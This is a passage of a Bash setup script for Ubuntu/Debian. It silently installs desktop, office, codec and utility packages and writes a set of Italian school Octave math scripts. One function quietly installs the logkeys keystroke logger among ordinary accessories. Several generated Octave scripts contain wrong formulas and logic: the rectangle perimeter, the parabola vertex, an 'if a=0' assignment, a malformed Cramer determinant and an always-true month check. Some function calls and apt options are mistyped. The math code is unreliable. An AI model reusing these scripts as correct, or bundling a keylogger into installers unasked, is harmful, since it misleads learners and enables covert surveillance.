f_pyne_buntu_debian () {

echo -n "[*] Installing PyneighBorHood ... "

timelapsed &

apt-get install -y --force-yes pyneighborhood mc xterm 1> /dev/null 2> $LOG

cd /mnt
mkdir -p Network
echo "/mnt/Network" >> $file
cd $home
mkdir -p .pyNeighborhood
echo "$home/.pyNeighborhood" >> $file
cd .pyNeighborhood

rm -f pyNeighbothood.log
touch pyNeighborhood.log
echo "$home/.pyNeighborhood /pyNeighborhood.log" >> $file

rm -f hosts.conf
touch hosts.conf
echo "$home/.pyNeighborhood /hosts.conf" >> $file

rm -f options.conf
touch options.conf
echo "$home/.pyNeighborhood /options.conf" >> $file

f_writing_pyne () {

echo "mount_directory = /mnt/Network
delete_dirs = False
file_managers = xterm -e thunar
workgroup =
client = smbclient
lookup = nmblookup
enable_smb = True
smb_mount = smbmount
smb_umount = smbumount
smb_options =
enable_cifs = True
cifs_mount = mount.cifs
cifs_umount = umount.cifs
cifs_options =
user =
password =
anonymous = True
enable_default = False
autoretrieve_ip = False
msbrowse = True
" >> options.conf

}

f_writing_pyne


cd $home

time_stop

}



# Office (Geany | Epdfview | Libreoffice | Geogebra | Gbase | Calcoo | Gperiodic)
f_office_buntu_debian () {

echo "[***] Office "

# Geany
f_geany () {

echo -n "  [*] Installing Geany ... "

timelapsed &

apt-get install -y --force-yes geany geany-plugins 1> /dev/null 2> $LOG

time_stop

}

f_geany

# PDF
f_pdf () {

echo -n "  [*] Installing EpdfView ... "
timelapsed &
apt-get install -y --force-yes epdfview 1> /dev/null 2> $LOG
time_stop

echo -n "  [*] Installing PdfEdit ... "
timelapsed &
apt-get install -y --force-yes pdfedit 1> /dev/null 2> $LOG
time_stop

}

f_pdf

# LibreOffice
f_libreoffice () {

echo -n "  [*] Installing LibreOffice ... "

timelapsed &

apt-get install -y --force-yes libreoffice-writer libreoffice-calc libreoffice-impress libreoffice-draw libreoffice-math libreoffice-gtk 1> /dev/null 2> $LOG

time_stop

}

f_libreoffice

# Math
f_math () {

echo -n "  [*] Installing Geogebra ... "
timelapsed &
apt-get install -y --force-yes geogebra libjama-java 1> /dev/null 2> $LOG
time_stop

echo -n "  [*] Installing Gbase ... "
timelapsed &
apt-get install -y --force-yes gbase 1> /dev/null 2> $LOG
time_stop

echo -n "  [*] Installing Calcoo ... "
timelapsed &
apt-get install -y --force-yes calcoo 1> /dev/null 2> $LOG
time_stop

echo -n "  [*] Installing Gperiodic ... "
timelapsed &
apt-get install -y --force-yes gperiodic 1> /dev/null 2> $LOG
time_stop

}

f_math

}



# Codecs (Flash | W32codecs | Gstreamer | Lame | DVD | Java)
f_codec_buntu () {

echo "[***] Codecs "

# Flash
f_flash () {

echo -n "  [*] installing Flash ... "

timelapsed &

apt-get install -y --force-yes flashplugin-installer 1> /dev/null 2> $LOG
apt-get install -y --force-yes flashplugin-nonfree-extrasound 1> /dev/null 2> $LOG

time_stop

}

f_flash

# W32codecs
f_w32codecs () {

echo -n "  [*] Installing W32Codecs ... "

timelapsed &

apt-get install -y --force-yes w32codecs 1> /dev/null 2> $LOG

time_stop

}

f_w32codecs

# Gstreamer
f_gstreamer () {

echo -n "  [*] Installing Gstreamer Codecs ... "

timelapsed &

apt-get install -y --force-yes gstreamer0.10-alsa 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-ffmpeg 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-gnonlin 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-fluendo-mp3 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-plugins-farsight 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-plugins-ugly 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-plugins-bad 1> /dev/null 2> $LOG

time_stop

}

f_gstreamer

# MP3
f_lame () {

echo -n "  [*] Installing Lame ... "

timelapsed &

apt-get install -y --force-yes lame 1> /dev/null 2> $LOG

time_stop

}

f_lame

# DVD
f_dvd () {

f_libavcodec_unstripped () {

echo -n "  [*] Installing Libavcodec-unstripepd-52 ... "

timelapsed &

apt-get install -y --force-yes libavcodec-unstripped-52 1> /dev/null 2> $LOG

time_stop

}

f_libavcodec_unstripped

f_lib_dvd_css2 () {

echo -n "  [*] Installing LibDvdCss2 ... "

timelapsed &

apt-get install -y --force-yes libdvdcss2 1> /dev/null 2> $LOG

time_stop

}

f_lib_dvd_css2

f_lib_dvd_nav_4 () {

echo -n "  [*] Installing LibDvdNav4 ... "

timelapsed &

apt-get install -y --force-yes libdvdnav4 1> /dev/null 2> $LOG

time_stop

}

f_lib_dvd_nav_4

f_lib_dvd_read_4 () {

echo -n "  [*] Installing LibDvdRead4 ... "

timelapsed &

apt-get install -y --force-yes libdvdread4 1> /dev/null 2> $LOG

time_stop

}

f_lib_dvd_read_4

f_udftools () {

echo -n "  [*] Installing UdfTools ... "

timelapsed &

apt-get install -y --force-yes libudf0 1> /dev/null 2> $LOG
apt-get install -y --force-yesudftools 1> /dev/null 2> $LOG
apt-get install -y --force-yeslibudf-dev 1> /dev/null 2> $LOG

time_stop

}

f_udftools

}

f_dvd

}

f_codec_debian () {

echo "[***] Codecs"

# Flash
f_flash () {

echo -n "  [*] installing Flash ... "

timelapsed &

apt-get install -y --force-yes flashplugin-nonfree 1> /dev/null 2> $LOG
apt-get install -y --force-yes flashplugin-nonfree-extrasound 1> /dev/null 2> $LOG

time_stop

}

f_flash

# W32codecs
f_w32codecs () {

echo -n "  [*] Installing W32Codecs ... "

timelapsed &

apt-get install -y --force-yes w32codecs 1> /dev/null 2> $LOG

time_stop

}

f_w32codecs

# Gstreamer
f_gstreamer () {

echo -n "  [*] Installing Gstreamer Codecs ... "

timelapsed &

apt-get install -y --force-yes gstreamer0.10-alsa 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-ffmpeg 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-gnonlin 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-fluendo-mp3 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-plugins-farsight 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-plugins-ugly 1> /dev/null 2> $LOG
apt-get install -y --force-yes gstreamer0.10-plugins-bad 1> /dev/null 2> $LOG

time_stop

}

f_gstreamer

# MP3
f_lame () {

echo -n "  [*] Installing Lame ... "

timelapsed &

apt-get install -y --force-yes lame 1> /dev/null 2> $LOG

time_stop

}

f_lame

# DVD
f_dvd () {

f_libavcodec_unstripped () {

echo -n "  [*] Installing Libavcodec-unstripepd-52 ... "

timelapsed &

apt-get install -y --force-yes libavcodec-unstripped-52 1> /dev/null 2> $LOG

time_stop

}

f_libavcodec_unstripped

f_lib_dvd_css2 () {

echo -n "  [*] Installing LibDvdCss2 ... "

timelapsed &

apt-get install -y --force-yes libdvdcss2 1> /dev/null 2> $LOG

time_stop

}

f_lib_dvd_css2

f_lib_dvd_nav_4 () {

echo -n "  [*] Installing LibDvdNav4 ... "

timelapsed &

apt-get install -y --force-yes libdvdnav4 1> /dev/null 2> $LOG

time_stop

}

f_lib_dvd_nav_4

f_lib_dvd_read_4 () {

echo -n "  [*] Installing LibDvdRead4 ... "

timelapsed &

apt-get install -y --force-yes libdvdread4 1> /dev/null 2> $LOG

time_stop

}

f_lib_dvd_read_4

f_udftools () {

echo -n "  [*] Installing UdfTools ... "

timelapsed &

apt-get install -y --force-yes libudf0 1> /dev/null 2> $LOG
apt-get install -y --force-yesudftools 1> /dev/null 2> $LOG
apt-get install -y --force-yeslibudf-dev 1> /dev/null 2> $LOG

time_stop

}

f_udftools

}

f_dvd

}



# Archive Manager
f_fileroller_buntu_debian () {

echo -n "  [*] Installing FileRoller ... "

timelapsed &

apt-get install -y --force-yes file-roller 1> /dev/null 2> $LOG

time_stop

}

f_ark_buntu_debian () {

echo -n "  [*] Installing Ark ... "

timelapsed &

apt-get install -y --force-yes ark 1> /dev/null 2> $LOG

time_stop

}

f_xarchiver_buntu_debian () {

echo -n "  [*] Installing Xarchiver ... "

timelapsed &

apt-get install -y --force-yes xarchiver 1> /dev/null 2> $LOG

time_stop

}



# Octave
f_octave_buntu_debian () {

echo "[***] Octave ... "

echo -n " [*] Installing Octave ... "

timelapsed &

apt-get install -y --force-yes octave3.2 1> /dev/null 2> $LOG

cd /usr/share
mkdir -p octave
echo "/usr/share/octave" >> $file
cd octave
mkdir -p 3.2.4
cd 3.2.4
echo "/usr/share/octave/3.2.4" >> $file
mkdir -p m
echo "/usr/share/octave/3.2.4/m" >> $file
cd m
mkdir -p school
echo "/usr/share/octave/3.2.4/m/school" >> $file
cd school

# 3
f_3 () {

echo "  [*] Creating Scripts of 3 ... "
mkdir -p 3
echo "/usr/share/octave/3.2.4/m/school/3" >> $file
cd 3

# DISPARI
f_dispari () {

rm -f DISPARI.m
touch DISPARI.m

echo "function DISPARI

clc

disp(£+Questo programma scrive i numeri dispari minori di un numero ed esclusi i multipli di un valore dato£+)

disp(£+£+)
a=input(£+Inserisci il valore rispetto a cui i numeri dispari devono essere minori£+);

disp(£+£+)
b=input(£+Inserisci il numero di cui i multipli non devono essere considerati£+);

clc

n=0;
for I=1:a
    if mod (I,b) !=0 & mod(I,2)==1
	     disp(I)
			n=n+1;
		 end
	end
end

disp(£+I numeri dispari minori di 100 che non sono multipli di 7 sono: £+)
disp(n)

endfunction

" | sed -e 's/£+/"/g' >> DISPARI.m

}

f_dispari

# RETTANGOLO
f_rettangolo () {

rm -f RETTANGOLO.m
touch RETTANGOLO.m

echo "function RETTANGOLO

%Questo programma calcola l'area e il perimetro di un rettangolo date le dimensioni

clc

B=input(£+La base del rettangolo è: £+);
H=input(£+L'altezza del rettangolo è: £+);

A=B*H;
P=2*(A+B);

disp(£+L'area del rettangolo è: £+),disp(A)
disp(£+Il perimetro del rettangolo è: £+),disp(P)

endfunction

" | sed -e 's/£+/"/g' >> RETTANGOLO.m

}

f_rettangolo

# PerimetroQuadrato
f_perimetro_quadrato () {

rm -f PerimetroQuadrato.m
touch PerimetroQuadrato.m

echo "function PerimetroQuadrato

%Questo programma calcola il perimetro di un quadrato e la diagonale data l'area

clc

A=input(£+Immetti l'area del quadrato: £+);

l=sqrt(A);
p=4*l;
d=sqrt(2)*l;

disp(£+Il perimetro del quadrato è: £+),disp(p)
disp(£+La diagonale del quadrato è: £+),disp(d)

endfunction

" | sed -e 's/£+/"/g' >>  PerimetroQuadrato.m

}

f_perimetro_quadrato

# VOLUMESFERA
f_volume_sfera () {

rm -f VOLUMESFERA.m
touch VOLUMESFERA.m

echo "function VOLUMESFERA

% Questo programma calcola il volume di una sfera noto il raggio

clc

disp(£+Questo programma calcola il volume di una sfera noto il raggio£+)

r=input(£+Immetti il raggio della sfera : £+);

V=4/3*pi*r^3;
disp(£+Il volume della sfera è: £+),disp(V)

endfunction

" | sed -e 's/£+/"/g' >> VOLUMESFERA.m

}

f_volume_sfera

# Equazione1Grado
f_equazione_1_grado () {

rm -f Equazione1grado.m
touch Equazione1Grado.m

echo "function Equazione1grado

%Equazioni di primo grado
%Questo programma discute equazioni di primo grado a coefficenti reali

clc

a=input(£+Immetti i coefficenti della x: £+);
disp(£+£+)

b=input(£+Immetti il coefficente del termine noto: £+);
disp(£+£+)

if a=0
   x=-b/a;
   disp(£+Lequazione è possibile e determinata, la soluzione è: £+)
   format rat
   disp(x)
else
   if b=0
      disp(£+L'equazione è impossibile£+)
   else
      disp(£+L'equazione è indeterminata£+)
   end
end

endfunction

" | sed -e 's/£+/"/g' >> Equazione1Grado.m

}

f_equazione_1_grado

# Simm
f_simm () {

rm -f Simm.m
touch Simm.m

echo "function [h,k]=Simm(X,Y)

h=-X;
k=-Y;

endfunction

" | sed -e 's/£+/"/g' >> Simm.m

}

f_simm

# Vert
f_vert () {

rm -f Vert.m
touch Vert.m

echo "function Vert

clc

a=input(£+Il valore di a è: £+)
b=input(£+Il valore di b è: £+)
c=input(£+Il valore di c è: £+)

[X,Y]=vertice(a,b,c);

disp(£+Le coordinate del vertice sono: £+),disp (X),disp (Y)
[h,k]=Simm(X,Y)

endfunction

" | sed -e 's/£+/"/g' >> Vert.m

}

f_vert

# vertice
f_vertice () {

rm -f vertice.m
touch vertice.m

echo "function [X,Y]=vertice(a,b,c);

X=-2*a/b
Y=-(b^2-4*a*c)/(4*a)

endfunction

" | sed -e 's/£+/"/g' >> vertice.m

}

f_vertice

# fat
f_fat () {

rm -f fat.m
touch fat.m

echo "function [f]=fat(n)

if n>0
   f=n*fat(n-1);
else f=1;
end

endfunction

" | sed -e 's/£+/"/g' >> fat.m

}

f_fat

# fib
f_fib () {

rm -f fib.m
touch fib.m

echo "function [f]=fib(a)

if a==1|a==2
   f=1;
else
   f=fib(a-1)+fib(a-2);
end

endfunction

" | sed -e 's/£+/"/g' >> fib.m

}

f_fib

# FIBONACCI
f_fibonacci () {

rm -f FIBONACCI.m
touch FIBONACCI.m

echo "function FIBONACCI

clc

a=input(£+Scrivi la posizione nella successione di Fibonacci: £+)

[f]=fib(a);

disp(£+Il numero richiesto è: £+),disp(f)

endfunction

" | sed -e 's/£+/"/g' >> FIBONACCI.m

}

f_fibonacci

cd ..

}

f_3

# 4
f_4 () {

echo "  [*] Creating Scripts of 4 ... "
mkdir -p 4
echo "/usr/share/octave/3.2.4/m/school/4" >> $file
cd 4

# quad
f_quad () {

rm -f quad.m
touch quad.m

echo "function quad

clc

disp(£+Questo programma calcola il quadrato di un numero naturale n sommando tutti gli n numeri dispari£+)

n=input(£+Scrivi il numero n naturale di cui calcolare il quadrato: £+)

if n==0
	disp(£+Quadrato richiesto : 0£+)

elseif n<0
	disp(£+Numero inserito non naturale!!!!!£+)

elseif n>0
	q=n+(n-1)*n
	disp(£+Quadrato del numero naturale n richiesto: £+)disp(q)

endif

endfunction
" | sed -e 's/£+/"/g' >> quad.m

}

f_quad

# quad2
f_quad2 () {

rm -f quad2.m
touch quad2.m

echo "function quad2

clc

disp(£+Questo programma calcola il quadrato di un numero naturale n sommando tutti gli n numeri dispari£+)

n=input(£+Scrivi il numero n naturale di cui calcolare il quadrato: £+)

s=0;
k=(2*n-1);

if n=0
	disp(£+Quadrato richiesto : 0£+)

elseif n<0
	disp(£+Numero inserito non naturale!!!!!£+)

else n>0
	while(k!=1)
		s=s+k
		k=k-2
	endwhile
	disp(£+Quadrato del numero selezionato : £+),disp(s)
endif

endfunction

" | sed -e 's/£+/"/g' >> quad2.m

}

f_quad2

# Cramer3X3
f_cramer_3_X_3 () {

rm -f Cramer3X3.m
touch Cramer3X3.m

echo "function Cramer3X3

% linear system with 3 equation and 3 incognitas

clc

disp(£+aX + bY + cZ = d£+)
disp(£+eX + fY + gZ = h£+)
disp(£+iX + lY + mZ = n£+)
disp(£+£+)
disp(£+£+)

a = input(£+a: £+)
b = input(£+b: £+)
c = input(£+c: £+)
d = input(£+d: £+)
e = input(£+e: £+)
f = input(£+f: £+)
g = input(£+g: £+)
h = input(£+h: £+)
i = input(£+i: £+)
l = input(£+l: £+)
m = input(£+m: £+)
n = input(£+n: £+)

A = [a,b,c; e,f,g; i,l,m];
disp(£+la matrice ridotta del sistema e'': £+)
disp(A)
disp (£+£+)

b = [d,h,n]
disp(£+Il vettore dei coefficienti e'': £+)
disp(b)
disp(£+£+)

% Calcolo Determinanti

D = (a*f*m + b*g*i + c*e*l - i*f*c - l*g*a - m*e*b);

if D == 0
	disp(£+Il determinane della matrice e'' uguale a 0!!!!!!!!£+)
else
	disp(£+Il determinante della matrice incompleta A e'':  £+),disp(D)

	X = (d*f*m + b*g*n + c*h*l - n*f*c - l*g*d - m*h*b);
	Y = (a*h*m + d*c*e*n - i*h*c - n*g*a - m*e*d);
	Z = (a*f*n + b*h*i + d*e*l - i*f*d - l*h*a - n*e*b);

	% Calcolo Incognite
	x = (X/D);
	y = (Y/D);
	z = (Z/D);
	disp(£+I valori delle incognite sono: £+)
	disp(£+x = £+),disp(x)
	disp(£+y = £+),disp(y)
	disp(£+z = £+),disp(z)
endif

endfunction

" | sed -e 's/£+/"/g' >> Cramer3X3.m

}

f_cramer_3X_3

# Date
f_date () {

rm -f Date.m
touch Date.m

echo "function Date

clc

g=input(£+Inserisci il giorno: £+)
m=input(£+Inserisci il mese: £+)
a=input(£+Inserisci l£+£+anno: £+)

if (m > 12)
	disp(£+il mese selezionato non esiste£+)
elseif (m==1|3|5|7|8|10|12)
   if (g<32)
		disp (£+La data è valida£+)
   else (£+la data non è valida£+)
   endif
elseif (m==4|6|9|11)
       if (g<31)
			disp (£+La data è valida£+)
	   else
			disp(£+la data non è valida£+)
	   endif
elseif (m==2)
       if (g<30)
			disp (£+La data è valida£+)
	   else
			disp(£+la data non è valida£+)
	   endif
else
	disp (£+La data non è valida£+)
endif

endfunction

" | sed -e 's/£+/"/g' >> Date.m

}

f_date

# Matrix
f_matrix () {

rm -f matrix.m
touch matrix.m

echo "function matrix

% Creazione  matrice

r=input(£+Scrivi il numero di righe della matrice: £+)
c =input(£+Scrivi il numero di colonne della matrice: £+)

for a = 1:r
	for b = 1:c
		V(a,b)=input(sprintf[%o,%0]=£+,a,b));
	endfor
endfor

disp(£+La matrice selezionata è: £+)
disp(V)

endfunction

" | sed -e 's/£+/"/g' >> matrix.m

}

f_matrix

# Perfect
f_perfect () {

rm -f perfect.m
touch perfect.m

echo "function perfect

% Verifica se un numero naturale in input è perfetto

clc

n=input(£+inserire numero naturale per sapere se e'' perfetto: £+)

k=1;

while (k <(n/2))
	mod(n,k) = 0
	k=k+1
endwhile

if n==k
	disp (£+il numero è perfetto£+)
else
	disp (£+Il numero non e'' perfetto£+)
endif

endfunction

" | sed -e 's/£+/"/g' >> perfect.m

}

f_perfect

# Rmatrix
f_rmatrix () {

rm -f Rmatrix.m
touch Rmatrix.m

echo "function Rmatrix

% Crea una matrice quadrata casuale dell'ordine dato

clc

n = input(£+Scrivere l'ordine della matrice richiesta: £+)

matrix=floor(100*rand(n,n));
for j = 1:n
	for i = 1:j
		a(i,j)=matrix(i,j)
	endfor
endfor

endfunction
" | sed -e 's/£+/"/g' >> Rmatrix.m

}

f_rmatrix

# Bubblesort
f_bubblesort () {

rm -f bubblesort.m
touch bubblesort.m

echo "function bubblesort

% Questo script riordina una lista numerica, in modo crescente o decrescente

clc

% Definizione Matrice
r = input(£+inserisci numero righe: £+)
for a=1:r
	V(a)=input(sprintf(£+m[%o]=£+,a));
endfor
disp (£+Vettore V:  £+),disp(V)


% Bubblesort
do

	% Menu
	disp(£+seleziona l''ordine richiesto : £+)
	disp(£+£+)
	disp(£+1 ----> ordine crescente£+)
	disp(£+2 ----> ordine decrescente£+)
	s =input(£+Choice: £+)

until (s == 1 | s == 2)

if s == 1
	for j=1:(r-1)
		for i= 1:(r-1)
			if V(i) > V(i+1)
					T = V(i);
					V(i) = V(i+1);
					V(i+1) = T;
			endif
		endfor
		i = 1;
	endfor
	disp(£+Vettore Ordinato: £+),disp(V)
endif

if s == 2
	for j=1:(r-1)
		for i=1:(r-1)
			if V(i) < V(i+1)
					T = V(i);
					V(i) = V(i+1);
					V(i+1) = T;
			endif
		endfor
		i = 1;
	endfor
	disp(£+Vettore Ordinato: £+),disp(V)
endif

endfunction

" | sed -e 's/£+/"/g' >> bubblesort.m

}

f_bubblesort

cd ..

}

f_4

# 5
f_5 () {

echo "  [*] Creating Scripts of 5 ... "
mkdir -p 5
echo "/usr/share/octave/3.2.4/m/school/5" >> $file
cd 5

# Bisezione
f_bisezione () {

rm -f bisezione.m
touch bisezione.m


f_writing_octave_bisezione () {

echo "function bisezione

clc

disp(£+Questo Script Calcola gli Zeri Approssimati Di Una Funzione Data Di Terzo Grado£+)
disp(£+£+)

a=input(£+Inserisci il coefficente dell'incognita' di terzo grado : £+);

b=input(£+Inserisci il coefficente dell'incognita' di secondo grado : £+);

c=input(£+Inserisci il coefficente dell'incognita' di primo grado : £+);

d=input(£+Inserisci il coefficente del termine noto : £+);

do

	clc

	do

		clc

		p=input(£+Inserisci il valore del minimo dell''intervallo : £+);

	until ( p != 0 )

	clc

	do

		clc

		q=input(£+Inserisci il valore del massimo dell'intervallo : £+);

	until ( q != 0 )

	P=( a*(p^3) + b*(p^2) + c*p + d );
	Q=( a*(q^3) + b*(q^2) + c*q + d );

	l=( P*Q );

	if ( l > 0 )
		disp(£+I valori dell'intervallo non permettono di usare questo metodo, riprova ...£+)
		sleep (3)
		k=3;
		clc
	else
		clc
		z=input(£+Inserisci Il valore di Epsilon, positivo e piccolo a piacere : £+);

		clc

		do
			P=( a*(p^3) + b*(p^2) + c*p + d );
			Q=( a*(q^3) + b*(q^2) + c*q + d );

			m=( (p+q)/2 );
			M=( a*(m^3) + b*(m^2) + c*m + d );

			if ( M*P > 0 )
				p=m;
			end

			if ( M*Q > 0 )
				q=m;
			end

		until ( abs(M) < z )

		k=1;

		clc

	endif

until ( k < 2)

clc

disp (£+Il valore approssimato dello zero e' : £+),disp(m)

endfunction
" | sed -e 's/£+/"/g' >> bisezione.m

}

f_writing_octave_bisezione

}

f_bisezione

# Corde
f_corde () {

rm -f corde.m
touch corde.m


f_writing_octave_corde () {

echo "function corde

clc

disp(£+Questo Script Calcola gli Zeri Approssimati Di Una Funzione Data Di Quinto Grado£+)
disp(£+£+)

a=input(£+Inserisci il coefficente dell'incognita' di quinto grado : £+);

b=input(£+Inserisci il coefficente dell'incognita' di quarto grado : £+);

c=input(£+Inserisci il coefficente dell'incognita' di terzo grado : £+);

d=input(£+Inserisci il coefficente dell'incognita' di secondo grado : £+);

e=input(£+Inserisci il coefficente dell'incognita' di primo grado : £+);

f=input(£+Inserisci il coefficente del termine noto : £+);

do

	clc

	do

		clc
		s=input(£+Inserisci il valore dell'ascissa del primo punto : £+);

	until ( s != 0 )

	clc

	do

		clc
		t=input(£+Inserisci il valore dell'ascissa del secondo punto : £+);

	until ( t != 0 )

	S=( a*(s^5) + b*(s^4) + c*(s^3) + d*(s^2) + e*s + f );
	T=( a*(t^5) + b*(t^4) + c*(t^3) + d*(t^2) + e*t + f );

	if ( S*T > 0 )
		disp(£+I valori dei punti non permettono di usare questo metodo, riprova ...£+)
		sleep (3)
		clc
		k=3;
	end

	if ( S*T < 0 )

		clc

		j=input(£+Inserisci Il valore di Epsilon, positivo e piccolo a piacere : £+);

		do

			S=( a*(s^5) + b*(s^4) + c*(s^3) + d*(s^2) + e*s + f )
			T=( a*(t^5) + b*(t^4) + c*(t^3) + d*(t^2) + e*t + f )

			p=((s*(T - S) - t*(t - s))/(T-S))
			P=( a*p^5 + b*p^4 + c*p^3 + d*p^2 + e*p + f )

			if ( S*P > 0 )
				s=p;
			endif

			if ( T*P > 0 )
				t=p;
			endif

		until ( abs(P) < j )

		k=1;

	end

until ( k < 2)

clc

disp (£+Il valore approssimato dello zero e' : £+),disp(p)

endfunction
" | sed -e 's/£+/"/g' >>  corde.m

}

f_writing_octave_corde

}

f_corde

# Plot Retta
f_plot_retta () {

rm -f plot_retta.m
touch plot_retta.m


f_writing_octave_plot_retta () {

echo "function plot_retta

clc

disp(£+Questo Script Disegna Una Retta Dall'Equazione Data£+)
disp(£+£+)

m=input(£+Inserisci Il Coefficente Angolare : £+)
q=input(£+Inserisci Il Termine Noto : £+)

x(1)=0;

n=100;

for s=2:n
	x(s)=x(s-1)+1;
	y(s)=m*x(s)+q;
end

plot (x,y,£+-£+)

endfunction
" | sed -e 's/£+/"/g' >> plot_retta.m
}

f_writing_octave_plot_retta

}

f_plot_retta

# Plot Parabola
f_plot_parabola () {

rm -f plot_parabola.m
touch plot_parabola.m


f_writing_octave_plot_parabola () {

echo "function plot_parabola

clc

disp(£+Questo Script Disegna Una Retta Dall£+£+Equazione Data£+)
disp(£+£+)

a=input(£+Inserisci Il Coefficente Del Termine Di Secondo grado : £+)
b=input(£+Inserisci Il Coefficente Del Termine Di Primo Grado : £+)
c=input(£+Inserisci Il Termine Noto : £+)

x(1)=-10;

n=100;

for s=2:n
	x(s)=x(s-1)+1;
	y(s)=a*x(s)*x(s)+b*x(s)+c;
end

plot (x,y,£+-£+)

endfunction
" | sed -e 's/£+/"/g' >> plot_parabola.m

}

f_writing_octave_plot_parabola

}

f_plot_parabola

# Plot PuntoFisso
f_plot_puntofisso () {

rm -f plot_puntofisso.m
touch plot_puntofisso.m


f_writing_octave_plot_puntofisso () {

echo "function plot_puntofisso

clc

disp(£+Questo Script Calcola La Distribuzione Dei Punti Derivati Dalla£+)
disp(£+Conversione Di Un Nome Dato Di 12 Lettere£+)

disp(£+£+)

do
	m=input(£+Inserisci Il Nome Desiderato Da 12 Lettere : £+,£+s£+);
	b=length (m);
	if b != 12
		disp(£+error : il nome deve essere di 12 caratteri !!!!!!£+)
	end
until b==12

for q=1:12
	a(q)=toascii (m(q));
	b(q)=a(q)*0.01;
end

x(1)=rand+10*rand+rand*rand-22*rand;
y(1)=x(1);

disp(£+£+)

do
	n=input(£+Inserisci Il Numero Di Punti Da Rappresentare : £+);
until (n>0)

for i=2:n
	x(i)=b(1)+b(2)*x(i-1)+b(3)*x(i-1)*x(i-1)+b(4)*x(i-1)*y(i-1)+b(5)*y(i-1)+b(6)*y(i-1)*y(i-1);
	y(i)=b(7)+b(8)*x(i-1)+b(9)*x(i-1)*x(i-1)+b(10)*x(i-1)*y(i-1)+b(11)*y(i-1)+b(12)*y(i-1)*y(i-1);
end

disp(£+£+)
disp(£+Now Plotting It All !!!!!!!£+)

plot (x,y,£+*£+)

endfunction
" | sed -e 's/£+/"/g' >> plot_puntofisso.m

}

f_writing_octave_plot_puntofisso

}

f_plot_puntofisso

cd $home

}

f_5

cd $home

time_stop

}



# Accesories
f_command_accessories_buntu_debian () {

# Alien
f_alien () {

echo -n "[*] Installing Alien ... "

timelapsed &

apt-get install -y --force-yes alien 1> /dev/null 2> $LOG

time_stop

}

f_alien

# FakeRoot
f_fakeroot () {

echo -n "[*] Installing FakeRoot ... "

timelapsed &

apt-get install -y --force-yes fakeroot 1> /dev/null 2> $LOG

time_stop

}

f_fakeroot

# Htop
f_htop () {

echo -n "[*] Installing Htop ... "

timelapsed &

apt-get install -y --force-yes htop 1> /dev/null  2> $LOG

time_stop

}

f_htop

# LogKeys
f_logkeys () {

echo -n "[*] Installing LogKeys ... "

timelapsed &

apt-get install -y --force-yes logkeys 1> /dev/null 2> $LOG

cd $home

mkdir -p .logkeys

cd $home

time_stop

}

f_logkeys

# Ntfs-3g
f_ntfs_3g () {

echo -n "[*] Installing Ntfs-3G ... "

timelapsed &

apt-get install -y --force-yes ntfs-3g 1> /dev/null 2> $LOG

time_stop

}

f_ntfs_3g

# OpenMPI
f_openmpi () {

echo -n "[*] Installing OpenMPI ... "

timelapsed &

apt-get install -y --force-yes openmpi-bin 1> /dev/null  2> $LOG

time_stop

}

f_openmpi

# Rpm
f_rpm () {

echo -n "[*] Installing Rpm ... "

timelapsed &

apt-get install -y --force-yes rpm 1> /dev/null 2> $LOG

time_stop

}

f_rpm

# Squashfs Tools
f_squash () {

echo -n "[*] Installing Squashfs-Tools ... "

timelapsed &

apt-get install -y --force-yes squashfs-tools 1> /dev/null 2> $LOG

time_stop

}

f_squash

# Partition Manager
f_partition () {

echo -n "[*] Installing Partition Editor Software ... "

timelapsed &

apt-get install -y --force-yes parted xfsprogs reiserfsprogs reiser4progs dmraid 1> /dev/null  2> $LOG

time_stop

}

f_partition

}

f_accessories_buntu_debian () {

echo "[***] Accessories"

# Bum
f_bum () {

echo -n "  [*] Installing Bum ... "

timelapsed &

apt-get install -y --force-yes bum  1> /dev/null  2> $LOG

time_stop

}

f_bum

# Jockey (Driver Manager)
f_jockey_gtk () {

echo -n "  [*] Installing Jockey-gtk ... "

timelapsed &

apt-get install -y --force-yes jockey-gtk  1> /dev/null 2> $LOG

time_stop

}

f_jockey_gtk

# Gconf-Editor
f_gconf () {

echo -n "  [*] Installing Gconf-Editor ... "

timelapsed &

apt-get install -y --force-yes gconf-editor 1> /dev/null 2> $LOG

time_stop

}

f_gconf

# Gmrun
f_gmrun () {

echo -n "  [*] Installing Gmrun ... "

timelapsed &

apt-get install -y --force-yes gmrun 1> /dev/null 2> $LOG

time_stop

}

f_gmrun

# GmountIso
f_gmountiso () {

echo -n "  [*] Installing GmountIso ... "

timelapsed &

apt-get install -y --force-yes gmountiso 1> /dev/null 2> $LOG

time_stop

}

f_gmountiso

# Isomaster
f_isomaster () {

echo -n "  [*] Installing Isomaster ... "

timelapsed &

apt-get install -y --force-yes isomaster 1> /dev/null 2> $LOG

time_stop

}

f_isomaster

# Meld file comparator
f_meld () {

echo -n "  [*] Installing Meld ..."

timelapsed &

apt-get install -y --force-yes meld 1> /dev/null 2> $LOG

time_stop

}

f_meld

# Partition Manager
f_partition () {

echo -n "  [*] Installing Partition Editor Software ... "

timelapsed &

apt-get install -y --force-yes gparted 1> /dev/null 2> $LOG
apt-get install -y --force-yes parted xfsprogs reiserfsprogs reiser4progs dmraid 1> /dev/null 2> $LOG

time_stop

}

f_partition

# Gnome Disk Utility
f_gnome_disk_utility () {

echo -n "  [*] Installing Gnome-Disk-Utility ... "

timelapsed &

apt-get install -y --force-yes gnome-disk-utility 1> /dev/null 2> $LOG

time_stop

}

f_gnome_disk_utility

# Synaptic
f_synaptic () {

echo -n "  [*] Installing Synaptic ... "

timelapsed &

apt-get install -y --force-yes synaptic 1> /dev/null 2> $LOG

time_stop

}

f_synaptic

# StopWatch
f_stopwatch () {

echo -n "  [*] Installing StopWatch ... "

timelapsed &

apt-get install -y --force-yes stopwatch 1> /dev/null 2> $LOG

time_stop

}

f_stopwatch

# Remastersys
f_remastersys () {

echo -n "  [*] Installing Remastersys ... "

timelapsed &

